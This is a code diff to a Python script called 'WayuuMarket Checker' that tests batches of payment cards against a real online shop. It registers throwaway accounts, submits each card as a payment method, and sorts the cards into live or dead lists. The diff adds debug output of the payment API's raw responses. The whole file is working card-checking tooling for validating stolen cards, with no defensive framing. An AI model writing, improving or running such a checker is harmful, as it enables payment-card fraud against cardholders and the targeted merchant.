@@ -1,6 +1,6 @@
 """
-WayuuMarket Checker v5.1
-Real decline responses + error handling
+WayuuMarket Checker v5.2
+Shows real API responses for verification
 """
 import requests
 import random
@@ -13,7 +13,7 @@ import re
 INPUT_FILE = "cards.txt"
 LIVE_FILE = "live.txt"
 DEAD_FILE = "dead.txt"
-DELAY = 5  # Increased delay to avoid rate limits
+DELAY = 5
 
 def randmail():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
@@ -44,7 +44,7 @@ def check_card(cc, mes, ano, cvv):
         r = s.get('https://wayuumarket.com/my-account/', timeout=60)
         m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
         if not m:
-            return 'ERROR', 'No register nonce'
+            return 'ERROR', 'No register nonce', ''
         
         email = randmail()
         s.post('https://wayuumarket.com/my-account/', data={
@@ -82,20 +82,23 @@ def check_card(cc, mes, ano, cvv):
             timeout=60
         ).json()
         
+        # Show PM response
+        print(f"[DEBUG] PM Response: {pm_resp}")
+        
         if 'error' in pm_resp:
             c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
             msg = pm_resp['error'].get('message', '')
             
             if c in ['incorrect_cvc', 'insufficient_funds', 'generic_decline', 'expired_card', 
                      'lost_card', 'stolen_card', 'do_not_honor', 'card_velocity_exceeded']:
-                return 'CCN', c
-            return 'DEAD', c or msg[:40]
+                return 'CCN', c, msg
+            return 'DEAD', c or msg[:40], msg
         
         pm_id = pm_resp.get('id', '')
         if not pm_id:
-            return 'ERROR', 'No PM'
+            return 'ERROR', 'No PM', ''
         
-        print(f"[*] PM: {pm_id[:20]}...")
+        print(f"[*] PM ID: {pm_id}")
         
         # Submit form
         print("[*] Submitting form...")
@@ -112,54 +115,70 @@ def check_card(cc, mes, ano, cvv):
             timeout=60
         )
         
-        txt = r.text.lower()
+        # Show response details
+        print(f"[DEBUG] Response URL: {r.url}")
+        print(f"[DEBUG] Response Status: {r.status_code}")
+        
+        # Extract any messages from response
+        txt = r.text
+        
+        # Look for success message
+        success_match = re.search(r'class="woocommerce-message"[^>]*>([^<]+)', txt)
+        if success_match:
+            print(f"[DEBUG] Success Message: {success_match.group(1).strip()}")
+        
+        # Look for error message  
+        error_match = re.search(r'class="woocommerce-error"[^>]*>.*?<li>([^<]+)', txt, re.DOTALL)
+        if error_match:
+            print(f"[DEBUG] Error Message: {error_match.group(1).strip()}")
+        
+        # Check for notices
+        notice_match = re.search(r'class="woocommerce-notice[^"]*"[^>]*>([^<]+)', txt)
+        if notice_match:
+            print(f"[DEBUG] Notice: {notice_match.group(1).strip()}")
+        
+        txt_lower = txt.lower()
         
         # Check responses
-        if 'added' in txt and ('success' in txt or 'payment method' in txt):
-            return 'CHARGED', 'Card Added!'
+        if success_match or ('payment method' in txt_lower and 'added' in txt_lower):
+            return 'CHARGED', 'Card Added!', success_match.group(1).strip() if success_match else 'Added'
         
-        if 'declined' in txt:
-            return 'CCN', 'Declined'
-        if 'insufficient' in txt:
-            return 'CCN', 'Insufficient Funds'
-        if 'incorrect' in txt and 'cvc' in txt:
-            return 'CCN', 'Incorrect CVC'
-        if 'security code' in txt:
-            return 'CCN', 'Security Code Error'
-        if 'expired' in txt:
-            return 'CCN', 'Expired Card'
-        if 'authentication' in txt or '3d secure' in txt:
-            return 'CCN', '3DS Required'
-        if 'lost' in txt or 'stolen' in txt:
-            return 'CCN', 'Lost/Stolen'
-        if 'do not honor' in txt:
-            return 'CCN', 'Do Not Honor'
-        if 'velocity' in txt:
-            return 'CCN', 'Card Velocity Exceeded'
+        if error_match:
+            err = error_match.group(1).strip()
+            if any(x in err.lower() for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen', 'security']):
+                return 'CCN', err[:40], err
+            return 'DEAD', err[:40], err
         
-        # Check for any error message
-        err_match = re.search(r'class="woocommerce-error"[^>]*>.*?<li>([^<]+)', r.text, re.DOTALL)
-        if err_match:
-            err = err_match.group(1).strip()
-            if any(x in err.lower() for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen']):
-                return 'CCN', err[:30]
-            return 'DEAD', err[:30]
+        if 'declined' in txt_lower:
+            return 'CCN', 'Declined', 'Card was declined'
+        if 'insufficient' in txt_lower:
+            return 'CCN', 'Insufficient Funds', 'Insufficient funds'
+        if 'cvc' in txt_lower or 'security code' in txt_lower:
+            return 'CCN', 'CVC Error', 'CVC verification failed'
+        if 'expired' in txt_lower:
+            return 'CCN', 'Expired', 'Card expired'
+        if 'authentication' in txt_lower or '3d secure' in txt_lower:
+            return 'CCN', '3DS Required', '3D Secure required'
+        
+        # Check if redirected to payment-methods (success)
+        if '/payment-methods/' in r.url and '/add-payment-method' not in r.url:
+            return 'CHARGED', 'Redirected to Payment Methods', 'Card likely added'
         
         brand = pm_resp.get('card', {}).get('brand', '').upper()
-        return 'LIVE', f'PM OK ({brand})'
+        return 'LIVE', f'PM OK ({brand})', 'No clear success/error message'
         
-    except requests.exceptions.ConnectionError:
-        return 'ERROR', 'Connection Reset (rate limit)'
+    except requests.exceptions.ConnectionError as e:
+        return 'ERROR', 'Connection Reset', str(e)[:50]
     except requests.exceptions.Timeout:
-        return 'ERROR', 'Timeout'
+        return 'ERROR', 'Timeout', 'Request timed out'
     except Exception as e:
-        return 'ERROR', str(e)[:30]
+        return 'ERROR', str(e)[:30], str(e)
 
 def main():
     print("""
     ╔═══════════════════════════════════════╗
-    ║    WAYUUMARKET CHECKER v5.1           ║
-    ║    Real Decline Responses             ║
+    ║    WAYUUMARKET CHECKER v5.2           ║
+    ║    With Debug Response Output         ║
     ╚═══════════════════════════════════════╝
     """)
     
@@ -177,8 +196,8 @@ def main():
         return
     
     print(f"Cards: {len(cards)}")
-    print(f"Delay: {DELAY}s (to avoid rate limits)")
-    print("=" * 40)
+    print(f"Delay: {DELAY}s")
+    print("=" * 50)
     
     stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
     
@@ -190,49 +209,54 @@ def main():
         cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
         full = f"{cc}|{mes}|{ano}|{cvv}"
         
-        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
+        print(f"\n{'='*50}")
+        print(f"[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
+        print(f"{'='*50}")
         
         start = time.time()
-        status, msg = check_card(cc, mes, ano, cvv)
+        status, msg, raw_response = check_card(cc, mes, ano, cvv)
         t = round(time.time() - start, 2)
         
+        print(f"\n[DEBUG] Raw Response: {raw_response}")
+        
         if status == 'CHARGED':
-            print(f"[CHARGED] {full}")
-            print(f"[+] {msg}")
-            print(f"[+] {get_bin(cc)}")
+            print(f"\n>>> [CHARGED] {full}")
+            print(f">>> {msg}")
+            print(f">>> {get_bin(cc)}")
             stats['charged'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
         elif status == 'CCN':
-            print(f"[CCN] {full}")
-            print(f"[+] {msg}")
-            print(f"[+] {get_bin(cc)}")
+            print(f"\n>>> [CCN] {full}")
+            print(f">>> {msg}")
+            print(f">>> {get_bin(cc)}")
             stats['ccn'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
         elif status == 'LIVE':
-            print(f"[LIVE] {full}")
-            print(f"[+] {msg}")
-            print(f"[+] {get_bin(cc)}")
+            print(f"\n>>> [LIVE] {full}")
+            print(f">>> {msg}")
+            print(f">>> {get_bin(cc)}")
             stats['live'] += 1
             open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
         elif status == 'ERROR':
-            print(f"[ERROR] {msg}")
+            print(f"\n>>> [ERROR] {msg}")
             stats['error'] += 1
-            # Wait longer on error
             if 'rate' in msg.lower() or 'connection' in msg.lower():
-                print("[*] Waiting 30s due to rate limit...")
+                print("[*] Waiting 30s...")
                 time.sleep(30)
         else:
-            print(f"[DEAD] {full}")
-            print(f"[-] {msg}")
+            print(f"\n>>> [DEAD] {full}")
+            print(f">>> {msg}")
             stats['dead'] += 1
             open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
         
-        print(f"[{t}s]")
+        print(f"\n[Time: {t}s]")
         
         if i < len(cards):
             time.sleep(DELAY)
     
-    print("\n" + "=" * 40)
+    print("\n" + "=" * 50)
+    print("FINAL RESULTS")
+    print("=" * 50)
     print(f"CHARGED: {stats['charged']}")
     print(f"CCN:     {stats['ccn']}")
     print(f"LIVE:    {stats['live']}")
